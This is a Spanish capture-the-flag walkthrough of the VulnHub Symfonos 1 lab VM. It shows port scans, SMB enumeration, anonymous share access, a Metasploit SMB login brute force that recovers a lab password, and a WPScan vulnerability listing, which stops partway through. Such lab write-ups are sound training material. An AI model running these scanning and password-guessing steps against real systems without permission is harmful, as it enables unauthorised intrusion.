# SYMFONOS
Desarrollo del CTF SYMFONOS

## 1. Configuración de la VM

- Descargar la VM: https://www.vulnhub.com/entry/symfonos-1,322/

## 2. Escaneo de Puertos

### 2.1. Escaneo de Puertos TCP

```
# Nmap 7.91 scan initiated Fri Mar 26 18:41:34 2021 as: nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.150
Nmap scan report for 10.10.10.150
Host is up (0.00039s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:7D:45:92 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2021-03-26T17:41:50-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-26T22:41:50
|_  start_date: N/A
```

<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos1.jpg" with=80% />

## 2.2. Escaneo UDP

```
nmap -vv --reason -Pn -sU -A --top-ports=20 --version-all -oN /root/SYMFONOS/autorecon/10.10.10.150/scans/_top_20_udp_nmap.txt -oX /root/SYMFONOS/autorecon/10.10.10.150/scans/xml/_top_20_udp_nmap.xml 10.10.10.150
Nmap scan report for 10.10.10.150
Host is up, received arp-response (0.00022s latency).
Scanned at 2021-03-26 18:42:26 EDT for 294s

PORT      STATE         SERVICE      REASON              VERSION
53/udp    open|filtered domain       no-response
67/udp    closed        dhcps        port-unreach ttl 64
68/udp    open|filtered dhcpc        no-response
69/udp    open|filtered tftp         no-response
123/udp   open|filtered ntp          no-response
135/udp   closed        msrpc        port-unreach ttl 64
137/udp   open          netbios-ns   udp-response        Samba nmbd netbios-ns (workgroup: WORKGROUP)
138/udp   open|filtered netbios-dgm  no-response
139/udp   closed        netbios-ssn  port-unreach ttl 64
161/udp   closed        snmp         port-unreach ttl 64
162/udp   closed        snmptrap     port-unreach ttl 64
445/udp   closed        microsoft-ds port-unreach ttl 64
500/udp   closed        isakmp       port-unreach ttl 64
514/udp   closed        syslog       port-unreach ttl 64
520/udp   closed        route        port-unreach ttl 64
631/udp   open|filtered ipp          no-response
1434/udp  open|filtered ms-sql-m     no-response
1900/udp  closed        upnp         port-unreach ttl 64
4500/udp  open|filtered nat-t-ike    no-response
49152/udp closed        unknown      port-unreach ttl 64
MAC Address: 00:0C:29:7D:45:92 (VMware)
Too many fingerprints match this host to give specific OS details
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=3/26%OT=%CT=%CU=67%PV=Y%DS=1%DC=D%G=N%M=000C29%TM=605E6478%P=x86_64-pc-linux-gnu)
SEQ(CI=Z%II=I)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: Host: SYMFONOS

Host script results:
| nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SYMFONOS<00>         Flags: <unique><active>
|   SYMFONOS<03>         Flags: <unique><active>
|   SYMFONOS<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00

```

## 3. Enumeración

### 3.1. Enumeración NETBIOS / SMB 

- Ejecutamos ENUM4LINUX para identificar usuarios y carpetas compartidas (se muestra solo lo más importante).

```
enum4linux -a -M -l -d 10.10.10.150
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Mar 26 18:42:47 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.150
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.150    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 10.10.10.150    |
 ============================================ 
Looking up status of 10.10.10.150
	SYMFONOS        <00> -         B <ACTIVE>  Workstation Service
	SYMFONOS        <03> -         B <ACTIVE>  Messenger Service
	SYMFONOS        <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

 ============================= 
|    Users on 10.10.10.150    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: helios	Name: 	Desc: 

user:[helios] rid:[0x3e8]
	User Name   :	helios
	Full Name   :	
	Home Drive  :	\\symfonos\helios
	Dir Drive   :	
	Profile Path:	\\symfonos\helios\profile
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 06 Feb 2036 10:06:39 EST
	Kickoff Time             :	Wed, 06 Feb 2036 10:06:39 EST
	Password last set Time   :	Fri, 28 Jun 2019 21:04:42 EDT
	Password can change Time :	Fri, 28 Jun 2019 21:04:42 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT

========================================= 
|    Share Enumeration on 10.10.10.150    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	helios          Disk      Helios personal share
	anonymous       Disk      
	IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.150
//10.10.10.150/print$	Mapping: DENIED, Listing: N/A
//10.10.10.150/helios	Mapping: DENIED, Listing: N/A
//10.10.10.150/anonymous	Mapping: OK, Listing: OK
//10.10.10.150/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

```

> Se obtiene lo siguiente: existe el usuario "helios" y que existen dos carpetas compartidas: "//10.10.10.150/helios" y "//10.10.10.150/anonymous".


<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos2.jpg" with=80% />


```
root@kali:~/SYMFONOS# smbclient \\\\10.10.10.150\\anonymous
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jun 28 21:14:49 2019
  ..                                  D        0  Fri Jun 28 21:12:15 2019
  attention.txt                       N      154  Fri Jun 28 21:14:49 2019

		19994224 blocks of size 1024. 17231220 blocks available
```

> Obtiene acceso anónimo a la carpeta: "//10.10.10.150/anonymous"

<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos3.jpg" with=80% />


> Finalmente, el archivo "attention.txt" tiene un mensaje que nos indica claramente diccionario de contraseña. Ya tenemos un usuario y un diccionario, toca probarlo mas adelante.

```
root@kali:~/SYMFONOS# cat attention.txt 

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```


### 3.2. Enumeración HTTP

- GOBUSTER y DIRSEARCH no brindan información importante. El NIKTO tampoco ayuda, parece no haber nada importante.

```
/.htpasswd (Status: 403) [Size: 296]
/.htpasswd.jsp (Status: 403) [Size: 300]
/.htpasswd.txt (Status: 403) [Size: 300]
/.htpasswd.html (Status: 403) [Size: 301]
/.htpasswd.php (Status: 403) [Size: 300]
/.htpasswd.asp (Status: 403) [Size: 300]
/.htpasswd.aspx (Status: 403) [Size: 301]
/.hta (Status: 403) [Size: 291]
/.hta.asp (Status: 403) [Size: 295]
/.hta.aspx (Status: 403) [Size: 296]
/.hta.jsp (Status: 403) [Size: 295]
/.hta.txt (Status: 403) [Size: 295]
/.hta.html (Status: 403) [Size: 296]
/.hta.php (Status: 403) [Size: 295]
/.htaccess (Status: 403) [Size: 296]
/.htaccess.txt (Status: 403) [Size: 300]
/.htaccess.html (Status: 403) [Size: 301]
/.htaccess.php (Status: 403) [Size: 300]
/.htaccess.asp (Status: 403) [Size: 300]
/.htaccess.aspx (Status: 403) [Size: 301]
/.htaccess.jsp (Status: 403) [Size: 300]
/index.html (Status: 200) [Size: 328]
/index.html (Status: 200) [Size: 328]
/manual (Status: 301) [Size: 313]
/server-status (Status: 403) [Size: 300]
```

<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos4.jpg" with=80% />

## 4. Identificar la Vulnerabilidad

### 4.1. Acceso a carpeta compartida

- Ya que tenemos un usuario y un posible diccionario, toca probar los accesos a los servicios que tengan aun mecanismo de autenticación.

```
msf6 > use auxiliary/scanner/smb/smb_login 
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.10.150
RHOSTS => 10.10.10.150
msf6 auxiliary(scanner/smb/smb_login) > set user_file /root/SYMFONOS/users.txt
user_file => /root/SYMFONOS/users.txt
msf6 auxiliary(scanner/smb/smb_login) > set pass_file /root/SYMFONOS/pass.txt
pass_file => /root/SYMFONOS/pass.txt
msf6 auxiliary(scanner/smb/smb_login) > exploit 

[*] 10.10.10.150:445      - 10.10.10.150:445 - Starting SMB login bruteforce
[-] 10.10.10.150:445      - 10.10.10.150:445 - Failed: '.\Helios:epidioko',
[!] 10.10.10.150:445      - No active DB -- Credential data will not be saved!
[+] 10.10.10.150:445      - 10.10.10.150:445 - Success: '.\Helios:qwerty'
[*] 10.10.10.150:445      - Error: 10.10.10.150: RubySMB::Error::EncryptionError Communication error with the remote host: Socket read returned nil. The server supports encryption but was not able to handle the encrypted request.
[*] 10.10.10.150:445      - Scanned 1 of 1 hosts (100% complete)
```

> Bingo, tenemos el acceso con el usuario Helios:qwerty.

<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos5.jpg" with=80% />


- Accedemos a la carpeta del usuario "helios" que también estaba compartida (lo descubrimos en la fase de enumeración).

```
root@kali:~/SYMFONOS# smbclient \\\\10.10.10.150\\helios -U helios
Enter WORKGROUP\helios's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jun 28 20:32:05 2019
  ..                                  D        0  Fri Jun 28 20:37:04 2019
  research.txt                        A      432  Fri Jun 28 20:32:05 2019
  todo.txt                            A       52  Fri Jun 28 20:32:05 2019

		19994224 blocks of size 1024. 17231216 blocks available
smb: \> get todo.txt
getting file \todo.txt of size 52 as todo.txt (25.4 KiloBytes/sec) (average 25.4 KiloBytes/sec)
smb: \> get research.txt
getting file \research.txt of size 432 as research.txt (210.9 KiloBytes/sec) (average 118.2 KiloBytes/sec)
smb: \> exit
root@kali:~/SYMFONOS# cat todo.txt

1. Binge watch Dexter
2. Dance
3. Work on /h3l105

root@kali:~/SYMFONOS# cat research.txt
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
```

<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos6.jpg" with=80% />

> El archivo "todo.txt" indica la existencia de una carpeta llamada "/h3l105" 

<img src="https://github.com/El-Palomo/SYMFONOS/blob/main/symfonos7.jpg" with=80% />

Importante: al cargar el WORDPRESS se llama al dominio "symfonos.local" asi que tuve que añadirlo en el archivo /etc/hosts.


### 4.2. LFI en WORDPRESS

- Ejecutamos WPSCAN para enumerar e identificar vulnerabilidades en WORDPRESS

```
root@kali:~/SYMFONOS# wpscan --api-token KEY --url=http://10.10.10.150/h3l105/ -e ap,u --plugins-detection aggressive  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.2
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.10.150/h3l105/ [10.10.10.150]
[+] Started: Fri Mar 26 23:47:12 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.150/h3l105/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.10.150/h3l105/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.10.150/h3l105/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.150/h3l105/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.150/h3l105/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.150/h3l105/, Match: 'WordPress 5.2.2'
 |
 | [!] 29 vulnerabilities identified:
 |
 | [!] Title: WordPress 5.2.2 - Cross-Site Scripting (XSS) in Stored Comments
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/1b880386-021d-43b1-9988-e196955c7a3e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16218
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress 5.2.2 - Authenticated Cross-Site Scripting (XSS) in Post Previews
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/140eece9-0cf9-4e0f-81c9-c22955588548
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16223
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress 5.2.2 - Potential Open Redirect
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/a5fa3ed3-aaf0-4b2f-bead-b1d2956e3403
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16220
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c86ee39ff4c1a79b93c967eb88522f5c09614a28
 |
 | [!] Title: WordPress 5.0-5.2.2 - Authenticated Stored XSS in Shortcode Previews
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8aca2325-14b8-4b9d-94bd-d20b2c3b0c77
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://fortiguard.com/zeroday/FG-VD-18-165
 |      - https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html
 |
 | [!] Title: WordPress 5.2.2 - Cross-Site Scripting (XSS) in Dashboard
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/6034fc8a-c418-467a-a7cf-893d1524447e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16221
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/4494a903-5a73-4cad-8c14-1e7b4da2be61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/d005b1f8-749d-438a-8818-21fba45c6465
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7804d8ed-457a-407e-83a7-345d3bbe07b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/26a26de2-d598-405d-b00c-61f71cfacff6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/715c00e3-5302-44ad-b914-131c162c3f71
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/4a6de154-5fbd-4c80-acd3-8902ee431bd8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/23553517-34e3-40a9-a406-f3ffbe9dd265
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16773
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/be794159-4486-4ae1-a5cc-5c190e5ddf5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
 |
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 |     Fixed in: 5.2.6
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7db191c0-d112-4f08-a419-a1cd81928c4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47634/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
 |
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 5.2.6
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 |     Fixed in: 5.2.6
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/4eee26bd-a27e-4509-a3a5-8019dd48e429
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47633/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Search Block
 |     Fixed in: 5.2.6
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/e4bda91b-067d-45e4-a8be-672ccf8b1a06
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11030
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47636/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-vccm-6gmc-qhjh
 |
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 |     Fixed in: 5.2.6
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47637/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 |     Fixed in: 5.2.6
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/55438b63-5fc9-4812-afc4-2f1eff800d5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47638/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
 |      - https://hackerone.com/reports/179695
 |
 | [!] Title: WordPress <= 5.2.3 - Hardening Bypass
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/378d7df5-bce2-406a-86b2-ff79cd699920
 |      - https://blog.ripstech.com/2020/wordpress-hardening-bypass/
 |      - https://hackerone.com/reports/436928
 |      - https://wordpress.org/news/2019/11/wordpress-5-2-4-update/
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS in Block Editor
 |     Fixed in: 5.2.7
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/831e4a94-239c-4061-b66e-f5ca0dbb84fa
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4046
